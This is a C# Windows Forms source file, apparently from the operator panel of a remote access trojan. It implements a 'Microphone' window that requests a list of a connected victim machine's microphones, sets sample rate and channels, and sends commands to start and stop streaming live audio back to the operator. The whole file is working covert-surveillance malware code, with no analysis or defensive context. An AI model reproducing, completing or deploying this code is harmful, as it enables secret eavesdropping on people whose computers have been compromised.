using System;
using System.Threading.Tasks;
using System.Windows.Forms;
using Server.Connection;
using Server.MessagePack;
using Server.Handle_Packet;
using System.Threading;

namespace Server.Forms
{
    public partial class FormMicrophone : Form
    {
        public FormMicrophone()
        {
            InitializeComponent();
            InitializeComboBoxes();
        }
        public Form1 F { get; set; }
        internal Clients Client { get; set; }
        internal Clients ParentClient { get; set; }

        private void timer1_Tick(object sender, EventArgs e)
        {
            try
            {
                if (!ParentClient.TcpClient.Connected || !Client.TcpClient.Connected) this.Close();
            }
            catch { }
        }

        public static int global_audiorate = 44100;
        public int GlobalAudioRate
        {
            get { return global_audiorate; }
        }

        public int global_audiochannels = 2;
        public int GlobalAudioChannels
        {
            get { return global_audiochannels; }
        }

        #region combobox
        private void InitializeComboBoxes()
        {
            comboBox1.Items.AddRange(new object[]
            {
                16000, // 16 kHz

                22050, // 22.05 kHz

                32000, // 32 kHz

                44100, // 44.1 kHz

                48000  // 48 kHz
            });
            comboBox1.SelectedIndex = 3;

            comboBox2.Items.AddRange(new object[]
            {
                "Mono",
                "Stereo"
            });
            comboBox2.SelectedIndex = 1;
        }

        #endregion

        private async void RefreshMics_Click(object sender, EventArgs e)
        {
            await Task.Run(() =>
            {
                MsgPack msgpack = new MsgPack();
                msgpack.ForcePathObject("Packet").AsString = "microphone";
                msgpack.ForcePathObject("Option").AsString = "requestmicro";
                ThreadPool.QueueUserWorkItem(Client.Send, msgpack.Encode2Bytes());
            });
        }

        private async void StartListen_Click(object sender, EventArgs e)
        {
            if (listBox1.SelectedIndex == -1)
            {
                MessageBox.Show("please chose a microphone.");
                return;
            }

            string audiomicro = listBox1.SelectedItem.ToString();
            string rate = comboBox1.Text;
            string channel = comboBox2.Text;

            string toSend = audiomicro + "\\" + rate + "\\" + channel;


            await Task.Run(() =>
            {
                MsgPack msgpack = new MsgPack();
                msgpack.ForcePathObject("Packet").AsString = "microphone";
                msgpack.ForcePathObject("Option").AsString = "audioY";
                msgpack.ForcePathObject("MicName").AsString = toSend;

                ThreadPool.QueueUserWorkItem(Client.Send, msgpack.Encode2Bytes());
            });
            StopListen.Enabled = true;
            StopListen.Visible = true;

            StartListen.Enabled = false;
            StartListen.Visible = false;

            comboBox1.Enabled = false;
            comboBox2.Enabled = false;
            listBox1.Enabled = false;
        }

        private async void StopListen_Click(object sender, EventArgs e)
        {
            await Task.Run(() =>
            {
                MsgPack msgpack = new MsgPack();
                msgpack.ForcePathObject("Packet").AsString = "microphone";
                msgpack.ForcePathObject("Option").AsString = "audioN";
                ThreadPool.QueueUserWorkItem(Client.Send, msgpack.Encode2Bytes());
            });
            AudioListener.StopAudio();

            StopListen.Enabled = false;
            StopListen.Visible = false;

            StartListen.Enabled = true;
            StartListen.Visible = true;

            comboBox1.Enabled = true;
            comboBox2.Enabled = true;
            listBox1.Enabled = true;
        }

        private async void FormMicrophone_FormClosed(object sender, FormClosedEventArgs e)
        {
            await Task.Run(() =>
            {
                MsgPack msgpack = new MsgPack();
                msgpack.ForcePathObject("Packet").AsString = "microphone";
                msgpack.ForcePathObject("Option").AsString = "audioN";
                ThreadPool.QueueUserWorkItem(Client.Send, msgpack.Encode2Bytes());
            });
            AudioListener.StopAudio();
            try
            {
                ThreadPool.QueueUserWorkItem((o) =>
                {
                    Client?.Disconnected();
                });
            }
            catch { }
        }
    }
}
